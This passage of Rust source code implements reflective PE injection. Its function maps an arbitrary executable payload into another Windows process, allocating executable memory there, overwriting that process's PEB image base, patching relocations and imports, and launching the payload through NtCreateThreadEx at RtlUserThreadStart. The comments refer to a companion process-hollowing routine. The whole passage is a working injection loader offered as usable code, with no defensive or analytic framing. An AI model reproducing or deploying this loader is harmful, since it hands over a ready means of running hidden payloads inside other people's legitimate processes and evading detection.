/// host's main module.  Note that this means the host process's own
/// `GetModuleHandle(NULL)` will, after this point, return the injected base \u2014
/// callers should be aware of that trade-off.  Failure to update the PEB is
/// non-fatal (logged at warn) so that injection still succeeds on hardened
/// processes that block the write.
pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
    if payload.len() < size_of::<IMAGE_DOS_HEADER>() {
        return Err(anyhow!("payload too small to contain DOS header"));
    }
    let dos_header = unsafe { &*(payload.as_ptr() as *const IMAGE_DOS_HEADER) };
    if dos_header.e_magic != 0x5A4D {
        return Err(anyhow!("invalid DOS magic"));
    }
    let nt_headers_offset = dos_header.e_lfanew as usize;
    if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > payload.len() {
        return Err(anyhow!("payload truncated before NT headers"));
    }
    let nt_headers =
        unsafe { &*((payload.as_ptr() as usize + nt_headers_offset) as *const IMAGE_NT_HEADERS) };
    if nt_headers.Signature != 0x00004550 {
        return Err(anyhow!("invalid NT signature"));
    }

    // 1. Allocate memory in the target process (preferred base first, then anywhere).
    let image_base = unsafe {
        VirtualAllocEx(
            process,
            nt_headers.OptionalHeader.ImageBase as *mut _,
            nt_headers.OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    let (image_base, is_relocated) = if image_base.is_null() {
        let new_base = unsafe {
            VirtualAllocEx(
                process,
                std::ptr::null_mut(),
                nt_headers.OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if new_base.is_null() {
            return Err(anyhow!(
                "VirtualAllocEx failed: {}",
                std::io::Error::last_os_error()
            ));
        }
        (new_base, true)
    } else {
        (image_base, false)
    };

    // 1b. Update PEB.ImageBaseAddress to point at the new allocation.  This
    // mirrors the pattern in `hollow_and_execute`: the injected payload may
    // call `GetModuleHandle(NULL)` to discover its own base address, and
    // without this update the call would return the host's main module
    // instead.  Failure here is non-fatal because the call only requires
    // PROCESS_QUERY_LIMITED_INFORMATION which the caller may not have granted.
    unsafe {
        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut return_length: u32 = 0;
        let status = NtQueryInformationProcess(
            process,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );
        if status == 0 && !pbi.PebBaseAddress.is_null() {
            // PEB.ImageBaseAddress: offset 0x10 on x64, 0x08 on x86.
            #[cfg(target_arch = "x86_64")]
            const IMAGE_BASE_OFFSET: usize = 0x10;
            #[cfg(target_arch = "x86")]
            const IMAGE_BASE_OFFSET: usize = 0x08;
            let new_base_val = image_base as usize;
            let mut peb_written: usize = 0;
            if WriteProcessMemory(
                process,
                (pbi.PebBaseAddress as usize + IMAGE_BASE_OFFSET) as *mut _,
                &new_base_val as *const _ as *const _,
                size_of::<usize>(),
                &mut peb_written,
            ) == 0
            {
                tracing::warn!(
                    "inject_into_process: failed to update remote PEB.ImageBaseAddress: {}",
                    std::io::Error::last_os_error()
                );
            }
        } else {
            tracing::warn!(
                "inject_into_process: NtQueryInformationProcess failed (NTSTATUS {:#x}); \
                 PEB.ImageBaseAddress not updated",
                status
            );
        }
    }

    // 2. Copy headers.
    let mut written: usize = 0;
    if unsafe {
        WriteProcessMemory(
            process,
            image_base,
            payload.as_ptr() as *const _,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            &mut written,
        )
    } == 0
    {
        return Err(anyhow!(
            "WriteProcessMemory(headers) failed: {}",
            std::io::Error::last_os_error()
        ));
    }

    // 3. Copy sections.
    let section_headers_offset = nt_headers_offset + size_of::<IMAGE_NT_HEADERS>();
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let sh: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };
        let mut written: usize = 0;
        if unsafe {
            WriteProcessMemory(
                process,
                (image_base as usize + sh.VirtualAddress as usize) as *mut _,
                (payload.as_ptr() as usize + sh.PointerToRawData as usize) as *const _,
                sh.SizeOfRawData as usize,
                &mut written,
            )
        } == 0
        {
            return Err(anyhow!(
                "WriteProcessMemory(section {}) failed: {}",
                String::from_utf8_lossy(&sh.Name),
                std::io::Error::last_os_error()
            ));
        }
    }

    // 4. Apply base relocations if required.
    if is_relocated {
        let delta = image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
        let reloc_dir =
            &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.VirtualAddress > 0 && reloc_dir.Size > 0 {
            let reloc_file_offset = match unsafe {
                rva_to_file_offset(
                    payload,
                    nt_headers_offset,
                    nt_headers.FileHeader.NumberOfSections,
                    reloc_dir.VirtualAddress,
                )
            } {
                Some(o) => o,
                None => {
                    return Err(anyhow!(
                        "relocation RVA {:#x} does not map to any section",
                        reloc_dir.VirtualAddress
                    ));
                }
            };
            let reloc_end = reloc_file_offset + reloc_dir.Size as usize;
            if reloc_end > payload.len() {
                return Err(anyhow!("relocation directory overruns payload buffer"));
            }
            let mut cur = reloc_file_offset;
            while cur < reloc_end {
                let block: &IMAGE_BASE_RELOCATION = unsafe {
                    &*((payload.as_ptr() as usize + cur) as *const IMAGE_BASE_RELOCATION)
                };
                let block_size = block.SizeOfBlock as usize;
                if block_size < size_of::<IMAGE_BASE_RELOCATION>() {
                    break;
                }
                let num_entries =
                    (block_size - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
                for i in 0..num_entries {
                    let entry_off = cur + size_of::<IMAGE_BASE_RELOCATION>() + i * size_of::<u16>();
                    let entry = unsafe { *(payload.as_ptr().add(entry_off) as *const u16) };
                    let reloc_type = entry >> 12;
                    let reloc_offset = entry & 0x0FFF;

                    // The relocation directory is strictly read from our local `payload` buffer
                    // because it is never written into the remote process headers.
                    let patch_base =
                        image_base as usize + block.VirtualAddress as usize + reloc_offset as usize;
                    if reloc_type == IMAGE_REL_BASED_DIR64 {
                        let patch_addr = patch_base as *mut c_void;
                        let mut orig: i64 = 0;
                        let mut bytes_read: usize = 0;
                        unsafe {
                            if ReadProcessMemory(
                                process,
                                patch_addr,
                                &mut orig as *mut _ as *mut _,
                                size_of::<i64>(),
                                &mut bytes_read,
                            ) == 0
                            {
                                continue;
                            }
                        }
                        let patched = orig + delta as i64;
                        let mut bytes_written: usize = 0;
                        unsafe {
                            WriteProcessMemory(
                                process,
                                patch_addr,
                                &patched as *const _ as *const _,
                                size_of::<i64>(),
                                &mut bytes_written,
                            );
                        }
                    } else if reloc_type == IMAGE_REL_BASED_HIGHLOW {
                        let patch_addr = patch_base as *mut c_void;
                        let mut orig: u32 = 0;
                        let mut bytes_read: usize = 0;
                        unsafe {
                            if ReadProcessMemory(
                                process,
                                patch_addr,
                                &mut orig as *mut _ as *mut _,
                                size_of::<u32>(),
                                &mut bytes_read,
                            ) == 0
                            {
                                continue;
                            }
                        }
                        let patched = (orig as i64 + delta as i64) as u32;
                        let mut bytes_written: usize = 0;
                        unsafe {
                            WriteProcessMemory(
                                process,
                                patch_addr,
                                &patched as *const _ as *const _,
                                size_of::<u32>(),
                                &mut bytes_written,
                            );
                        }
                    }
                }
                cur += block_size;
            }
        }
    }

    // 5. Resolve imports (read descriptors from child via ReadProcessMemory;
    //    resolve symbols from parent's loaded DLLs; write back IAT entries).
    let import_dir =
        &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress > 0 {
        let mut import_desc_offset = import_dir.VirtualAddress as usize;
        loop {
            let mut import_desc: IMAGE_IMPORT_DESCRIPTOR = unsafe { zeroed() };
            let mut bytes_read: usize = 0;
            let remote_addr = (image_base as usize + import_desc_offset) as *const c_void;
            unsafe {
                if ReadProcessMemory(
                    process,
                    remote_addr,
                    &mut import_desc as *mut _ as *mut c_void,
                    size_of::<IMAGE_IMPORT_DESCRIPTOR>(),
                    &mut bytes_read,
                ) == 0
                {
                    return Err(anyhow!(
                        "ReadProcessMemory(import descriptor) failed: {}",
                        std::io::Error::last_os_error()
                    ));
                }
            }
            if import_desc.Name == 0 {
                break;
            }

            let lib_name = unsafe {
                read_remote_cstr(process, image_base as usize + import_desc.Name as usize)?
            };
            let lib_name_c = std::ffi::CString::new(lib_name.as_bytes())
                .map_err(|e| anyhow!("invalid import DLL name: {e}"))?;
            let lib_handle = unsafe { LoadLibraryA(lib_name_c.as_ptr()) };
            if lib_handle.is_null() {
                return Err(anyhow!(
                    "Failed to load library {}: {}",
                    lib_name,
                    std::io::Error::last_os_error()
                ));
            }

            // OriginalFirstThunk (Characteristics) = ILT: holds name/ordinal RVAs and
            // is never overwritten by the loader, so it is reliable for bound imports.
            // FirstThunk = IAT: we overwrite this with the resolved addresses.
            let orig_first_thunk = unsafe { *import_desc.u.Characteristics() } as usize;
            let first_thunk = import_desc.FirstThunk as usize;
            let ilt_base = if orig_first_thunk != 0 {
                orig_first_thunk
            } else {
                first_thunk
            };
            let mut read_offset = ilt_base;
            let mut write_offset = first_thunk;
            loop {
                let remote_ilt_addr = (image_base as usize + read_offset) as *const c_void;
                let remote_iat_addr = (image_base as usize + write_offset) as *mut c_void;
                let mut func_addr_val: usize = 0;
                unsafe {
                    if ReadProcessMemory(
                        process,
                        remote_ilt_addr,
                        &mut func_addr_val as *mut _ as *mut c_void,
                        size_of::<usize>(),
                        &mut bytes_read,
                    ) == 0
                    {
                        return Err(anyhow!(
                            "ReadProcessMemory(thunk) failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                }
                if func_addr_val == 0 {
                    break;
                }

                let proc_addr: FARPROC = if IMAGE_SNAP_BY_ORDINAL(func_addr_val as u64) {
                    let ordinal = (func_addr_val & 0xFFFF) as u16;
                    unsafe { GetProcAddress(lib_handle, ordinal as *const i8) }
                } else {
                    let name_remote = image_base as usize + func_addr_val + 2;
                    let func_name = unsafe { read_remote_cstr(process, name_remote)? };
                    let func_name_c = std::ffi::CString::new(func_name.as_bytes())
                        .map_err(|e| anyhow!("invalid imported function name: {e}"))?;
                    unsafe { GetProcAddress(lib_handle, func_name_c.as_ptr()) }
                };

                if proc_addr.is_null() {
                    return Err(anyhow!("Failed to resolve function in {}", lib_name));
                }

                let mut written: usize = 0;
                unsafe {
                    if WriteProcessMemory(
                        process,
                        remote_iat_addr,
                        &proc_addr as *const _ as *const _,
                        size_of::<usize>(),
                        &mut written,
                    ) == 0
                    {
                        return Err(anyhow!("WriteProcessMemory(IAT) failed"));
                    }
                }
                read_offset += size_of::<usize>();
                write_offset += size_of::<usize>();
            }
            import_desc_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
        }
    }

    // 6. Set section protections.
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let sh: &IMAGE_SECTION_HEADER = unsafe {
            &*((payload.as_ptr() as usize
                + section_headers_offset
                + (i as usize * size_of::<IMAGE_SECTION_HEADER>()))
                as *const IMAGE_SECTION_HEADER)
        };
        let addr = (image_base as usize + sh.VirtualAddress as usize) as *mut _;
        let size = *unsafe { sh.Misc.VirtualSize() } as usize;
        let exec = sh.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = sh.Characteristics & IMAGE_SCN_MEM_READ != 0;
        let write = sh.Characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let prot: u32 = match (exec, read, write) {
            (true, _, true) => PAGE_EXECUTE_READWRITE,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };
        let mut old_prot = 0;
        unsafe {
            if VirtualProtectEx(process, addr, size, prot, &mut old_prot) == 0 {
                tracing::warn!(
                    "VirtualProtectEx failed for section {}",
                    String::from_utf8_lossy(&sh.Name)
                );
            }
        }
    }

    // Flush the instruction cache to ensure coherent execution for the new mappings
    unsafe {
        winapi::um::processthreadsapi::FlushInstructionCache(process, std::ptr::null(), 0);
    }

    // 7. Create a remote thread at the payload's entry point.
    let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
    let mut thread: HANDLE = std::ptr::null_mut();
    
    let ntdll = unsafe { winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8) };
    if ntdll.is_null() {
        return Err(anyhow!("GetModuleHandleA failed for ntdll.dll"));
    }
    let rtl_user_thread_start = unsafe { winapi::um::libloaderapi::GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr() as *const i8) };
    if rtl_user_thread_start.is_null() {
        return Err(anyhow!("GetProcAddress failed for RtlUserThreadStart"));
    }
    
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process,
            rtl_user_thread_start as _,
            entry_point as _,
            0, // CREATE_SUSPENDED=1 (but we can just run it=0)
            0,
            0,
            0,
            std::ptr::null_mut()
        )
    };
    if status < 0 || thread.is_null() {
        return Err(anyhow!("NtCreateThreadEx failed with NTSTATUS {:#x}", status));
    }
    
    unsafe { CloseHandle(thread) };
    tracing::info!("inject_into_process: remote thread started at {entry_point:#x} natively via RtlUserThreadStart");
    Ok(())
}
